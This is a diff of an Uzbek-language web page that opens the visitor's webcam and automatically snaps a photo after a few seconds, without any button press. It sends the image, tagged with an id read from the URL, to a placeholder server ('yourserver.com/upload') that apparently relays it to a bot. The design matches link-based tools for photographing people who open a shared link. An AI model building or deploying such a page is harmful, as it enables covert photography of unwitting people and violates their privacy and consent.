@@ -1,96 +1,112 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="uz">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Rasm Oluvchi Sayt</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      flex-direction: column;
-      background-color: #f0f0f0;
-    }
-    #camera {
-      border: 2px solid #ccc;
-      border-radius: 10px;
-    }
-    #result {
-      margin-top: 20px;
-      font-size: 18px;
-      color: green;
-    }
-    #captured-image {
-      margin-top: 20px;
-      border: 2px solid #ccc;
-      border-radius: 10px;
-      max-width: 100%;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rasmga Olish</title>
+    <style>
+        body {
+            text-align: center;
+            font-family: Arial, sans-serif;
+        }
+        video {
+            width: 100%;
+            max-width: 400px;
+            margin-top: 20px;
+            border-radius: 10px;
+        }
+        button {
+            margin-top: 10px;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            background: #007BFF;
+            color: white;
+            border: none;
+            border-radius: 5px;
+        }
+        button:hover {
+            background: #0056b3;
+        }
+    </style>
 </head>
 <body>
-  <h1>Kamerangiz orqali rasm oling</h1>
-  <video id="camera" autoplay></video>
-  <img id="captured-image" src="#" alt="Captured Image" style="display: none;">
-  <div id="result"></div>
 
-  <script>
-    const video = document.getElementById('camera');
-    const resultDiv = document.getElementById('result');
-    const capturedImage = document.getElementById('captured-image');
+    <h1>Rasmga tushirilmoqda...</h1>
+    <video id="video" autoplay></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+    <button id="retry" style="display: none;">Qayta urinish</button>
 
-    // Kamerani yoqish
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        video.srcObject = stream;
+    <script>
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const ctx = canvas.getContext("2d");
+        const retryButton = document.getElementById("retry");
 
-        // Video yuklanganida avtomatik rasm olish
-        video.addEventListener('play', () => {
-          setTimeout(() => {
-            capturePhoto();
-          }, 1000); // 1 soniya kutib, rasmni oladi
+        function startCamera() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+                    setTimeout(captureImage, 5000); // 5 soniyada rasmga oladi
+                })
+                .catch(err => {
+                    console.error("Kameraga ruxsat berilmadi!", err);
+                    document.body.innerHTML = "<h1>Kameraga ruxsat berilmadi!</h1>";
+                    retryButton.style.display = "block";
+                });
+        }
+
+        function captureImage() {
+            if (!video.srcObject) {
+                console.error("Kamera yoqilmagan!");
+                return;
+            }
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Rasmni base64 formatda olish
+            const imageData = canvas.toDataURL("image/png");
+
+            // Rasmni Node.js botga yuborish
+            fetch("https://yourserver.com/upload", {
+                method: "POST",
+                mode: "cors",
+                body: JSON.stringify({
+                    image: imageData,
+                    userId: getQueryParam("id")
+                }),
+                headers: { "Content-Type": "application/json" }
+            })
+            .then(res => {
+                if (!res.ok) throw new Error("Serverdan noto‘g‘ri javob keldi");
+                return res.json();
+            })
+            .then(data => {
+                document.body.innerHTML = "<h1>Sizning rasmingiz botga yuborildi!</h1>";
+            })
+            .catch(err => {
+                console.error("Xatolik:", err);
+                document.body.innerHTML = `<h1>Xatolik yuz berdi! Qayta urinib ko‘ring.</h1>`;
+                retryButton.style.display = "block";
+            });
+        }
+
+        function getQueryParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+        }
+
+        retryButton.addEventListener("click", () => {
+            document.body.innerHTML = `<h1>Rasmga tushirilmoqda...</h1>
+                                       <video id="video" autoplay></video>
+                                       <canvas id="canvas" style="display: none;"></canvas>`;
+            startCamera();
         });
-      })
-      .catch(err => {
-        console.error('Kamera yoqilmadi:', err);
-      });
 
-    // Rasmni olish funksiyasi
-    function capturePhoto() {
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const context = canvas.getContext('2d');
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        startCamera();
+    </script>
 
-      // Rasmni ekranga chiqarish
-      const imageUrl = canvas.toDataURL('image/jpeg');
-      capturedImage.src = imageUrl;
-      capturedImage.style.display = 'block';
-
-      // Rasmni serverga yuborish
-      fetch('https://yourserver.com/upload', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          image: imageUrl,
-          userId: new URLSearchParams(window.location.search).get('id'), // URL dan userId ni olish
-        }),
-      })
-        .then(response => response.json())
-        .then(data => {
-          resultDiv.textContent = 'Sizning rasmingiz bu botga jo\'natildi!';
-        })
-        .catch(error => {
-          console.error('Xatolik:', error);
-          resultDiv.textContent = 'Rasm yuborishda xatolik yuz berdi.';
-        });
-    }
-  </script>
 </body>
 </html>
